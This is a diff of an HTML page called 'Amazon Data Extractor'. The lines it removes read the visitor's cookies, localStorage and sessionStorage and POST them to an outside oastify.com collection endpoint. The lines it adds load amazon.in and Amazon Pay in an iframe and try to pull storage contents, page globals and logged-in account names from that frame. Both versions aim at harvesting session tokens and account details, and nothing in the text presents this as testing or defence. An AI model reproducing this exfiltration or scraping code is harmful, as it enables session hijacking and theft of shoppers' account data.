@@ -1,51 +1,94 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Amazon Data Extractor</title>
+    <title>Amazon Data Explorer</title>
+    <style>
+        body { margin: 0; font-family: monospace; }
+        iframe { width: 100%; height: 50vh; border: 1px solid #ccc; }
+        #output { 
+            height: 40vh; 
+            overflow: auto; 
+            background: #f5f5f5; 
+            padding: 10px;
+            white-space: pre-wrap;
+            font-size: 12px;
+        }
+        button { padding: 10px; margin: 5px; }
+    </style>
 </head>
 <body>
-    <h1>Data Extraction</h1>
-    <div id="output"></div>
+    <h1>Amazon Data Extractor</h1>
+    <button onclick="extractData()">Extract Data</button>
+    <button onclick="loadAmazon()">Load Amazon.com</button>
+    <button onclick="loadAmazonPay()">Load Amazon Pay</button>
+    <div id="output">Ready...</div>
+    <iframe id="amazonFrame" src="about:blank"></iframe>
+    
     <script>
+        const frame = document.getElementById('amazonFrame');
+        const output = document.getElementById('output');
+        
         function log(msg) {
-            document.getElementById('output').innerHTML += msg + '<br>';
+            output.innerHTML += msg + '\n';
             console.log(msg);
         }
         
-        // Extract all cookies
-        log('Cookies: ' + document.cookie);
-        
-        // Check localStorage
-        log('LocalStorage items: ' + localStorage.length);
-        for(let i = 0; i < localStorage.length; i++) {
-            let key = localStorage.key(i);
-            log('  ' + key + ': ' + localStorage.getItem(key));
+        function loadAmazon() {
+            log('Loading Amazon India...');
+            frame.src = 'https://www.amazon.in';
         }
         
-        // Check sessionStorage
-        log('SessionStorage items: ' + sessionStorage.length);
-        for(let i = 0; i < sessionStorage.length; i++) {
-            let key = sessionStorage.key(i);
-            log('  ' + key + ': ' + sessionStorage.getItem(key));
+        function loadAmazonPay() {
+            log('Loading Amazon Pay...');
+            frame.src = 'https://www.amazon.in/apay';
         }
         
-        // Get current page info
-        log('Current URL: ' + window.location.href);
-        log('Document title: ' + document.title);
-        log('Meta tags: ' + document.querySelectorAll('meta').length);
+        function extractData() {
+            try {
+                const frameDoc = frame.contentDocument || frame.contentWindow.document;
+                
+                log('\n=== Extracting Data ===');
+                log('URL: ' + frame.contentWindow.location.href);
+                log('Cookies: ' + document.cookie);
+                log('LocalStorage items: ' + localStorage.length);
+                
+                // Try to access Amazon's data
+                for(let i = 0; i < localStorage.length; i++) {
+                    let key = localStorage.key(i);
+                    log('  ' + key + ': ' + localStorage.getItem(key));
+                }
+                
+                // Check for session storage
+                log('SessionStorage items: ' + sessionStorage.length);
+                for(let i = 0; i < sessionStorage.length; i++) {
+                    let key = sessionStorage.key(i);
+                    log('  ' + key + ': ' + sessionStorage.getItem(key));
+                }
+                
+                // Look for common Amazon globals
+                const win = frame.contentWindow;
+                if (win.amazon) log('Found window.amazon');
+                if (win.Amazon) log('Found window.Amazon');
+                if (win.apay) log('Found window.apay');
+                
+                // Check page title
+                log('Page title: ' + frameDoc.title);
+                
+                // Check for login status
+                const loginElements = frameDoc.querySelectorAll('[data-testid="nav-customer-name"], #nav-link-accountList');
+                if (loginElements.length > 0) {
+                    log('User appears logged in');
+                    loginElements.forEach(el => log('  Account: ' + el.innerText));
+                }
+                
+            } catch(e) {
+                log('Error: ' + e.message);
+                log('This is expected due to cross-origin restrictions. The iframe content is from a different domain.');
+            }
+        }
         
-        // Send data to your server (if you want)
-
-        fetch('https://h7pxdietsy9w62he8s5czv22nttkhg55.oastify.com/collect', {
-            method: 'POST',
-            body: JSON.stringify({
-                cookies: document.cookie,
-                localStorage: localStorage,
-                url: window.location.href
-            }),
-            headers: {'Content-Type': 'application/json'}
-        });
-
+        // Automatically load Amazon
+        setTimeout(loadAmazon, 1000);
     </script>
 </body>
 </html>
